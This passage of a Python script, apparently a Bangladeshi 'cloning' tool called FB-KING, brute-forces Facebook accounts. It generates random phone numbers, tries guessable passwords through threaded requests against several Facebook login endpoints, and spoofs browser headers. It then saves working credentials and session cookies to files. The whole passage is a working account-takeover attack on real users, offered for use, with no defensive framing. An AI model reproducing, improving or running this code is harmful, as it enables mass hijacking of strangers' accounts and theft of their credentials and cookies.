    banner();print(f'{dot}Method{RED} : {H}M-'+hc);print(f'{dot}Number{RED} : {H}{kode}');print(f'{dot}Limit {RED} : {H}{tl}');print(led)
    for guru in user:
      idf = kode+koda+kodb+guru
      pwv = [koda+kodb+guru,koda+kodb+guru[1:],idf,kode+koda+kodb,kode+koda+kodb[1:],'@#@#@#','bangladesh','free fire','i love you']
      if hc in ['1','01']:king_xd.submit(m1,idf,pwv,mf)
      elif hc in ['2','02']:king_xd.submit(m1,idf,pwv,mf)      
      elif hc in ['3','03']:king_xd.submit(m1,idf,pwv,pf)
      elif hc in ['4','04']:king_xd.submit(m1,idf,pwv,xf)
      elif hc in ['5','05']:king_xd.submit(m1,idf,pwv,alphaf)
      elif hc in ['6','06']:king_xd.submit(m1,idf,pwv,freef)
      elif hc in ['7','07']:king_xd.submit(m1,idf,pwv,mbasicf)
      else:
       king_xd.submit(main,idf,pwv)
# BANGLADESH 7 DIGIT -- MAIN DEF #
def x7():
  user=[]
  os.system('clear');banner();print(c7);print(led)
  kode = input(f'{dot}Select Code {M}: {H}');print(led);print(limitt);print(led)
  limit = int(input(f'{dot}Crack Limit {M}: {H}'));print(led)
  xd_cp=input(f'{wt}Cloning Show cp Account  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
  if xd_cp in ['y','Y','yes','Yes','1']:cp_xdx.append('y')
  else:cp_xdx.append('n')
  print(led)
  cokixx=input(f'{wt}Cloning Show Cookie  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
  if cokixx in ['y','Y','yes','Yes','1']:cokix.append('y')
  else:cokix.append('n')
  clear();banner();print(f"{dot}{P}Number  {RED}: {H}"+kode);print(led);print(f' {K}[{H}1{K}] {P}Method [{H}M1{P}]');print(f' {K}[{H}2{K}] {P}Method [{H}M2{P}]');print(f' {K}[{H}3{K}] {P}Method [{H}M3{P}]')
  print(f' {K}[{H}4{K}] {P}Method [{H}M4{P}]');print(f' {K}[{H}5{K}] {P}Method [{H}A1{P}]');print(f' {K}[{H}6{K}] {P}Method [{H}F1{P}]');print(led)
  hc = input(f'{wt}Select Method {M}:{H} ')
  for nmbr in range(limit):
    nmp = ''.join(random.choice(string.digits) for _ in range(7))
    user.append(nmp)
  with tred(max_workers=30) as king_xd:
    os.system('clear')
    tl = str(len(user))
    banner();print(f'{dot}Method{RED} : {H}M-'+hc);print(f'{dot}Number{RED} : {H}{kode}');print(f'{dot}Limit {RED} : {H}{tl}');print(led)
    for guru in user:
      idf = kode+guru
      pwv=[idf,guru,guru[1:],idf[:7],idf[:6],idf[:8]]
      if hc in ['1','01']:king_xd.submit(m3,idf,pwv)
      elif hc in ['2','02']:king_xd.submit(t1,idf,pwv)
      elif hc in ['3','03']:king_xd.submit(m3,idf,pwv)
      elif hc in ['4','04']:king_xd.submit(m4,idf,pwv)
      elif hc in ['5','05']:king_xd.submit(f1,idf,pwv)
      elif hc in ['6','06']:king_xd.submit(f1,idf,pwv)
      else:
       king_xd.submit(m5,idf,pwv)
  print('');print(f'{N} Hi Dear User Crack process has been completed')
  input(f'{dot}Press Enter To Go Menu');os.system('python FB-KING.py')
  
def m1(idf,pwv):
    global loop, ok, cp
    animasi = random.choice(["\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING","\x1b[1;97mKING","\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING"])
    sys.stdout.write(f'\r{P} [{animasi}-{H}M1{P}] ({B}%s{P}){U}+{H}OK{P}({GREEN}%s{P})'%(loop,ok)),
    sys.stdout.flush()
    az = "A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"
    rr = random.randint
    rc = random.choice
    ugen1 = f"Mozilla/5.0 (Linux; Android {str(rr(10,13))}; Redmi Note 9 Pro Max Build/QKQ1.{str(rr(111111,999999))}.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.{str(rr(1111,9999))}.{str(rr(11,99))} Mobile Safari/537.36"
    pro = random.choice(ugen)
    for pw in pwv: 
        try:
            session = requests.Session()
            pw = pw.lower()
            get = session.get(f"https://m.facebook.com/login/?email={idf}&pass={pw}&locale2=id_ID")
            date = {
            "lsd":re.search('name="lsd" value="(.*?)"',str(get.text)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(get.text)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"',str(get.text)).group(1),
            "li":re.search('name="li" value="(.*?)"',str(get.text)).group(1),
            "email":idf,"pass":pw,"Host":"https://m.facebook.com/login/save-device/?login=source_login&ref=wizard"
         }         
            respons =({
            'Host': f'm.facebook.com',
           'accept': 'image/webp,image/png,image/svg+xml,image/*;q=0.8,video/*;q=0.8,*/*;q=0.5','accept-encoding': 'gzip,deflate',
           'accept-language': 'es_LA,id;q=0.9','content-length': f'{str(rr(1111,9999))}',
           'content-type': 'application/x-www-form-urlencoded','origin': 'https://m.facebook.com',
           'referer': f'https://m.facebook.com/reg/?cid=103&refid=8',
           'user-agent': pro,
           'sec-fetch-dest': f'{random.choice(["empty","document"])}',
           'sec-fetch-mode': f'{random.choice(["navigate","cors"])}',
           'sec-fetch-site': f'{random.choice(["none","same-origin"])}',
           'sec-fetch-user': f'{random.choice(["?1","empty"])}',
           'x-requested-with': 'www.facebook.com',
           'x-xss-protection': '0',
           'sec-ch-ua': '" Not A;Brand";v="99", "Microsoft Edge";v="101", "Chromium";v="101"',
           'sec-ch-ua-mobile': '?0'})
          
           
            yz = session.post(f'https://m.facebook.com/login/device-based/login/async/?refsrc=wizard', headers=respons, data=date, allow_redirects=False)
            if "checkpoint" in session.cookies.get_dict().keys():
             idf = session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
             cp+=1
             print(pro)
             if 'y' in cp_xdx:
              print(f'\r{P} [\033[1;30mKING-CP{P}] \033[1;30m{idf}|{pw}{xxx}')
             open(' /sdcard/ULTRA-GREEN-CP.txt', 'a').write(idf+'|'+pw)
             cp.append(idf)
             break
            elif "c_user" in session.cookies.get_dict().keys():
                if "unlock" == lock_ck(idf):
                    
                    kukis = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                    idf = re.findall('c_user=(.*);xs', kukis)[0]
                    ok+=1
                    print(pro)
                    print(f'\r{P} [{H}KING-OK{P}] {GREEN}{idf}|{pw}{xxx}')
                    if 'y' in cokix:
                        print(f'\r{gen}{H}'+kukis)
                    else:pass
                    open(' /sdcard/ULTRA-GREEN-OK.txt', 'a').write(idf+'|'+pw)
                    ok.append(idf+'|'+pw)
                    break
                else:pass
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1
    
   # {updat} 
    
def m9(idf,pwv,updat,mostak):
    '''global hc
    for im in range(1):
        if hc in '1':
            methode='M1'
        elif hc in '2':
            methode='M2'
        elif hc in '3':
            methode='M3'
        elif hc in '4':
            methode='M4'
        elif hc in '5':
            methode='M5'
        elif hc in '6':
            methode='M6'
        else:
            methode='M7'
    print(methode);time.sleep(10)
      '''  
    #print(mostakim);sys.exit()
    global loop, ok, cp
    animasi = random.choice(["\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING","\x1b[1;97mKING","\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING"])
    sys.stdout.write(f'\r{P} [{animasi}-{H}{mostak}{P}] ({B}%s{P}){U}+{H}OK{P}({GREEN}%s{P})'%(loop,ok)),
    sys.stdout.flush()
    az = "A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"
    rr = random.randint
    rc = random.choice
    ugen1 = f"Mozilla/5.0 (Linux; Android {str(rr(10,13))}; Redmi Note 9 Pro Max Build/QKQ1.{str(rr(111111,999999))}.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.{str(rr(1111,9999))}.{str(rr(11,99))} Mobile Safari/537.36"
    #pro = random.choice(ugen)
    pro = random.choice(ugen12)
    for pw in pwv: 
        # f"{len(str(dataa))}"
        try:
            session = requests.Session()
            pw = pw.lower()
            get = session.get(f"https://{updat}/login/?email={idf}&pass={pw}&locale2=id_ID")
            date = {
            "lsd":re.search('name="lsd" value="(.*?)"',str(get.text)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(get.text)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"',str(get.text)).group(1),
            "li":re.search('name="li" value="(.*?)"',str(get.text)).group(1),
            "email":idf,"pass":pw,"Host":f"https://{updat}/login/save-device/?login=source_login&ref=wizard"
         }                                          
            respons =({
            'Host': f'{updat}',
            'content-length': f'{len(str(date))}',
            'sec-ch-ua': '"Not A(Brand";v="99", "Android WebView";v="121", "Chromium";v="121"',
            'sec-ch-ua-mobile': '?1',
            'user-agent': pro,
            'x-response-format': 'JSONStream',
            'content-type': 'application/x-www-form-urlencoded',
            'x-fb-lsd': 'AVqIXs_9oeo',
            'viewport-width': '360',
            'sec-ch-ua-platform-version': '""',
            'x-requested-with': 'XMLHttpRequest',
            'x-asbd-id': '129477',
            'dpr': '2',
            'sec-ch-ua-full-version-list': '',
            'sec-ch-ua-model': '""',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua-platform': '"Android"',
            'accept': '*/*',
            'origin': f'https://{updat}',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': f'https://{updat}/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-BD,en-US;q=0.9,en;q=0.8'})

            yz = session.post(f'https://{updat}/login/device-based/login/async/?refsrc=deprecated&lwv=100', headers=respons, data=date, allow_redirects=False)
            if "checkpoint" in session.cookies.get_dict().keys():
             idf = session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
             cp+=1
             print(pro)
             if 'y' in cp_xdx:
              print(f'\r{P} [\033[1;30mKING-CP{P}] \033[1;30m{idf}|{pw}{xxx}')
             open(' /sdcard/ULTRA-GREEN-CP.txt', 'a').write(idf+'|'+pw)
             cp.append(idf)
             break
            elif "c_user" in session.cookies.get_dict().keys():
                kukis = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                idf = re.findall('c_user=(.*);xs', kukis)[0]
                ok+=1
                print(pro)
                print(f'\r{P} [{H}KING-OK{P}] {GREEN}{idf}|{pw}{xxx}')
                if 'y' in cokix:
                 print(f'\r{gen}{H}'+kukis)
                open(' /sdcard/ULTRA-GREEN-OK.txt', 'a').write(idf+'|'+pw)
                ok.append(idf+'|'+pw)
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1
    
def F1(idf,pwv):
    global loop, ok, cp
    animasi = random.choice(["\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING","\x1b[1;97mKING","\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING"])
    sys.stdout.write(f'\r{P} [{animasi}-{H}M1{P}] ({B}%s{P}){U}+{H}OK{P}({GREEN}%s{P})'%(loop,ok)),
    sys.stdout.flush()
    az = "A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"
    rr = random.randint
    rc = random.choice
    ugen1 = f"Mozilla/5.0 (Linux; Android {str(rr(10,13))}; Redmi Note 9 Pro Max Build/QKQ1.{str(rr(111111,999999))}.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.{str(rr(1111,9999))}.{str(rr(11,99))} Mobile Safari/537.36"
    pro = random.choice(ugen)
    for pw in pwv: 
        try:
            session = requests.Session()
            pw = pw.lower()
            get = session.get(f"https://free.facebook.com/login/?email={idf}&pass={pw}&locale2=id_ID")
            date = {
            "lsd":re.search('name="lsd" value="(.*?)"',str(get.text)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(get.text)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"',str(get.text)).group(1),
            "li":re.search('name="li" value="(.*?)"',str(get.text)).group(1),
            "email":idf,"pass":pw,"Host":"https://free.facebook.com/login/save-device/?login=source_login&ref=wizard"
         }                                            
            #my head free facebook
            respons =({
            'Host': f'free.facebook.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-BD,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'dpr': '2',
            'referer': f'https://free.facebook.com/?stype=lo&deoia=1&jlou=AfdQFB5eADwiqTXNYjdbVNcCqjHbqwlJnUkxEQKgRht-KT-dltaDjlYkOOwFn3XRSzOkMc1FrtgwFdlYK7iToE9zGeIAeRLtPf870J_d3n6pSw&smuh=31338&lh=Ac_AchkdbMqMbH8ej_o&wtsid=rdr_0mfo0SB1uxZP5ZXsw&_rdr',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
            'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': f'{random.choice(["empty","document"])}',
            'sec-fetch-mode': f'{random.choice(["navigate","cors"])}',
            'sec-fetch-site': f'{random.choice(["none","same-origin"])}',
            'sec-fetch-user': f'{random.choice(["?1","empty"])}',
            'upgrade-insecure-requests': '1',
            'user-agent': pro,})

            yz = session.post(f'https://free.facebook.com/login/device-based/login/async/?refsrc=wizard', headers=respons, data=date, allow_redirects=False)
            if "checkpoint" in session.cookies.get_dict().keys():
             idf = session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
             cp+=1
             if 'y' in cp_xdx:
              print(f'\r{P} [\033[1;30mKING-CP{P}] \033[1;30m{idf}|{pw}{xxx}')
             open(' /sdcard/ULTRA-GREEN-CP.txt', 'a').write(idf+'|'+pw)
             cp.append(idf)
             break
            elif "c_user" in session.cookies.get_dict().keys():
                kukis = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                idf = re.findall('c_user=(.*);xs', kukis)[0]
                ok+=1
                print(f'\r{P} [{H}KING-OK{P}] {GREEN}{idf}|{pw}{xxx}')
                if 'y' in cokix:
                 print(f'\r{gen}{H}'+kukis)
                open(' /sdcard/ULTRA-GREEN-OK.txt', 'a').write(idf+'|'+pw)
                ok.append(idf+'|'+pw)
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1
    
def a1(idf,pwv):
    global loop, ok, cp
    animasi = random.choice(["\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING","\x1b[1;97mKING","\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING"])
    sys.stdout.write(f'\r{P} [{animasi}-{H}M1{P}] ({B}%s{P}){U}+{H}OK{P}({GREEN}%s{P})'%(loop,ok)),
    sys.stdout.flush()
    az = "A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"
    rr = random.randint
    rc = random.choice
    ugen1 = f"Mozilla/5.0 (Linux; Android {str(rr(10,13))}; Redmi Note 9 Pro Max Build/QKQ1.{str(rr(111111,999999))}.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.{str(rr(1111,9999))}.{str(rr(11,99))} Mobile Safari/537.36"
    pro = random.choice(ugen)
    for pw in pwv: 
        try:
            session = requests.Session()
            pw = pw.lower()
            get = session.get(f"https://m.alpha.facebook.com/login/?email={idf}&pass={pw}&locale2=id_ID")
            date = {
            "lsd":re.search('name="lsd" value="(.*?)"',str(get.text)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(get.text)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"',str(get.text)).group(1),
            "li":re.search('name="li" value="(.*?)"',str(get.text)).group(1),
            "email":idf,"pass":pw,"Host":"https://m.alpha.facebook.com/login/save-device/?login=source_login&ref=wizard"
         }                                            
            #my head alpha facebook
            #m.alpha.facebook.com
            respons =({
            'Host': f'm.alpha.facebook.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-BD,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'dpr': '2',
            'referer': f'm.alpha.facebook.com/?stype=lo&deoia=1&jlou=AfdQFB5eADwiqTXNYjdbVNcCqjHbqwlJnUkxEQKgRht-KT-dltaDjlYkOOwFn3XRSzOkMc1FrtgwFdlYK7iToE9zGeIAeRLtPf870J_d3n6pSw&smuh=31338&lh=Ac_AchkdbMqMbH8ej_o&wtsid=rdr_0mfo0SB1uxZP5ZXsw&_rdr',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
            'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': f'{random.choice(["empty","document"])}',
            'sec-fetch-mode': f'{random.choice(["navigate","cors"])}',
            'sec-fetch-site': f'{random.choice(["none","same-origin"])}',
            'sec-fetch-user': f'{random.choice(["?1","empty"])}',
            'upgrade-insecure-requests': '1',
            'user-agent': pro,})
            

            yz = session.post(f'https://m.alpha.facebook.com/login/device-based/login/async/?refsrc=wizard', headers=respons, data=date, allow_redirects=False)
            if "checkpoint" in session.cookies.get_dict().keys():
             idf = session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
             cp+=1
             if 'y' in cp_xdx:
              print(f'\r{P} [\033[1;30mKING-CP{P}] \033[1;30m{idf}|{pw}{xxx}')
             open(' /sdcard/ULTRA-GREEN-CP.txt', 'a').write(idf+'|'+pw)
             cp.append(idf)
             break
            elif "c_user" in session.cookies.get_dict().keys():
                kukis = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                idf = re.findall('c_user=(.*);xs', kukis)[0]
                ok+=1
                print(f'\r{P} [{H}KING-OK{P}] {GREEN}{idf}|{pw}{xxx}')
                if 'y' in cokix:
                 print(f'\r{gen}{H}'+kukis)
                open(' /sdcard/ULTRA-GREEN-OK.txt', 'a').write(idf+'|'+pw)
                ok.append(idf+'|'+pw)
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1
# 
def x1(idf,pwv):
    global loop, ok, cp
    animasi = random.choice(["\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING","\x1b[1;97mKING","\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING"])
    sys.stdout.write(f'\r{P} [{animasi}-{H}M1{P}] ({B}%s{P}){U}+{H}OK{P}({GREEN}%s{P})'%(loop,ok)),
    sys.stdout.flush()
    az = "A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"
    rr = random.randint
    rc = random.choice
    ugen1 = f"Mozilla/5.0 (Linux; Android {str(rr(10,13))}; Redmi Note 9 Pro Max Build/QKQ1.{str(rr(111111,999999))}.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.{str(rr(1111,9999))}.{str(rr(11,99))} Mobile Safari/537.36"
    pro = random.choice(ugen)
    for pw in pwv: 
        try:
            session = requests.Session()
            pw = pw.lower()
            get = session.get(f"https://x.facebook.com/login/?email={idf}&pass={pw}&locale2=id_ID")
            date = {
            "lsd":re.search('name="lsd" value="(.*?)"',str(get.text)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(get.text)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"',str(get.text)).group(1),
            "li":re.search('name="li" value="(.*?)"',str(get.text)).group(1),
            "email":idf,"pass":pw,"Host":"https://x.facebook.com/login/save-device/?login=source_login&ref=wizard"
         }                                            
            #my head x facebook
            #x.facebook.com
            respons =({
            'Host': f'x.facebook.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-BD,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'dpr': '2',
            'referer': f'https://x.facebook.com/?stype=lo&deoia=1&jlou=AfdQFB5eADwiqTXNYjdbVNcCqjHbqwlJnUkxEQKgRht-KT-dltaDjlYkOOwFn3XRSzOkMc1FrtgwFdlYK7iToE9zGeIAeRLtPf870J_d3n6pSw&smuh=31338&lh=Ac_AchkdbMqMbH8ej_o&wtsid=rdr_0mfo0SB1uxZP5ZXsw&_rdr',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
            'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': f'{random.choice(["empty","document"])}',
            'sec-fetch-mode': f'{random.choice(["navigate","cors"])}',
            'sec-fetch-site': f'{random.choice(["none","same-origin"])}',
            'sec-fetch-user': f'{random.choice(["?1","empty"])}',
            'upgrade-insecure-requests': '1',
            'user-agent': pro,})
            

            yz = session.post(f'https://x.facebook.com/login/device-based/login/async/?refsrc=wizard', headers=respons, data=date, allow_redirects=False)
            if "checkpoint" in session.cookies.get_dict().keys():
             idf = session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
             cp+=1
             if 'y' in cp_xdx:
              print(f'\r{P} [\033[1;30mKING-CP{P}] \033[1;30m{idf}|{pw}{xxx}')
             open(' /sdcard/ULTRA-GREEN-CP.txt', 'a').write(idf+'|'+pw)
             cp.append(idf)
             break
            elif "c_user" in session.cookies.get_dict().keys():
                kukis = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                idf = re.findall('c_user=(.*);xs', kukis)[0]
                ok+=1
                print(f'\r{P} [{H}KING-OK{P}] {GREEN}{idf}|{pw}{xxx}')
                if 'y' in cokix:
                 print(f'\r{gen}{H}'+kukis)
                open(' /sdcard/ULTRA-GREEN-OK.txt', 'a').write(idf+'|'+pw)
                ok.append(idf+'|'+pw)
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1
#---------def mbasic--------
def mb(idf,pwv):
    global loop, ok, cp
    animasi = random.choice(["\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING","\x1b[1;97mKING","\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING"])
    sys.stdout.write(f'\r{P} [{animasi}-{H}M1{P}] ({B}%s{P}){U}+{H}OK{P}({GREEN}%s{P})'%(loop,ok)),
    sys.stdout.flush()
    az = "A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"
    rr = random.randint
    rc = random.choice
    ugen1 = f"Mozilla/5.0 (Linux; Android {str(rr(10,13))}; Redmi Note 9 Pro Max Build/QKQ1.{str(rr(111111,999999))}.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.{str(rr(1111,9999))}.{str(rr(11,99))} Mobile Safari/537.36"
    pro = random.choice(ugen)
    for pw in pwv: 
        try:
            session = requests.Session()
            pw = pw.lower()
            get = session.get(f"https://mbasic.facebook.com/login/?email={idf}&pass={pw}&locale2=id_ID")
            date = {
            "lsd":re.search('name="lsd" value="(.*?)"',str(get.text)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(get.text)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"',str(get.text)).group(1),
            "li":re.search('name="li" value="(.*?)"',str(get.text)).group(1),
            "email":idf,"pass":pw,"Host":"https://mbasic.facebook.com/login/save-device/?login=source_login&ref=wizard"
         }                                            
            #my head mbasic facebook
            respons =({
            'Host': f'mbasic.facebook.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-BD,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'dpr': '2',
            'referer': f'mbasic.facebook.com/?stype=lo&deoia=1&jlou=AfdQFB5eADwiqTXNYjdbVNcCqjHbqwlJnUkxEQKgRht-KT-dltaDjlYkOOwFn3XRSzOkMc1FrtgwFdlYK7iToE9zGeIAeRLtPf870J_d3n6pSw&smuh=31338&lh=Ac_AchkdbMqMbH8ej_o&wtsid=rdr_0mfo0SB1uxZP5ZXsw&_rdr',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
            'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': f'{random.choice(["empty","document"])}',
            'sec-fetch-mode': f'{random.choice(["navigate","cors"])}',
            'sec-fetch-site': f'{random.choice(["none","same-origin"])}',
            'sec-fetch-user': f'{random.choice(["?1","empty"])}',
            'upgrade-insecure-requests': '1',
            'user-agent': pro,})
            

            yz = session.post(f'https://mbasic.facebook.com/login/device-based/login/async/?refsrc=wizard', headers=respons, data=date, allow_redirects=False)
            if "checkpoint" in session.cookies.get_dict().keys():
             idf = session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
             cp+=1
             if 'y' in cp_xdx:
              print(f'\r{P} [\033[1;30mKING-CP{P}] \033[1;30m{idf}|{pw}{xxx}')
             open(' /sdcard/ULTRA-GREEN-CP.txt', 'a').write(idf+'|'+pw)
             cp.append(idf)
             break
            elif "c_user" in session.cookies.get_dict().keys():
                kukis = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                idf = re.findall('c_user=(.*);xs', kukis)[0]
                ok+=1
                print(f'\r{P} [{H}KING-OK{P}] {GREEN}{idf}|{pw}{xxx}')
                if 'y' in cokix:
                 print(f'\r{gen}{H}'+kukis)
                open(' /sdcard/ULTRA-GREEN-OK.txt', 'a').write(idf+'|'+pw)
                ok.append(idf+'|'+pw)
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1
#def p.facebook.com
def p1(idf,pwv):
    global loop, ok, cp
    animasi = random.choice(["\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING","\x1b[1;97mKING","\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING"])
    sys.stdout.write(f'\r{P} [{animasi}-{H}M1{P}] ({B}%s{P}){U}+{H}OK{P}({GREEN}%s{P})'%(loop,ok)),
    sys.stdout.flush()
    az = "A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"
    rr = random.randint
    rc = random.choice
    ugen1 = f"Mozilla/5.0 (Linux; Android {str(rr(10,13))}; Redmi Note 9 Pro Max Build/QKQ1.{str(rr(111111,999999))}.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.{str(rr(1111,9999))}.{str(rr(11,99))} Mobile Safari/537.36"
    pro = random.choice(ugen)
    for pw in pwv: 
        try:
            session = requests.Session()
            pw = pw.lower()
            get = session.get(f"https://p.facebook.com/login/?email={idf}&pass={pw}&locale2=id_ID")
            date = {
            "lsd":re.search('name="lsd" value="(.*?)"',str(get.text)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(get.text)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"',str(get.text)).group(1),
            "li":re.search('name="li" value="(.*?)"',str(get.text)).group(1),
            "email":idf,"pass":pw,"Host":"https://p.facebook.com/login/save-device/?login=source_login&ref=wizard"
         }                                            
            #my head p. facebook
            #p.facebook.com
            respons =({
            'Host': f'p.facebook.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-BD,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'dpr': '2',
